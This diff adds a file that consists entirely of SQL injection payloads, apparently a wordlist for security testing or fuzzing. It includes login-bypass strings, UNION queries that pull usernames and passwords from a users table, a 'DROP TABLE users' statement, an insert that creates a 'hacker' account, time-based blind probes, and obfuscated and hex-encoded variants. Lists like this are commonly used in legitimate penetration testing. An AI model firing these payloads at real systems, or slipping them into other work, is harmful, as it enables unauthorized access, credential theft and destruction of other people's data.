@@ -1,0 +1,15 @@
+' OR '1'='1
+' OR 1=1 --
+admin'--
+' UNION SELECT 1,2 --
+' UNION SELECT username,password FROM users --
+'; DROP TABLE users; --
+'; INSERT INTO users(username,password) VALUES('hacker','pw'); --
+' AND SLEEP(5) --
+' AND BENCHMARK(1000000,MD5(1)) --
+' AND 1=(SELECT 1) --
+' OR EXISTS(SELECT * FROM users) --
+'/**/OR/**/1=1/**/--
+0x27204f5220313d31202d2d
+' ORDER BY 1 --
+' GROUP BY 1 --
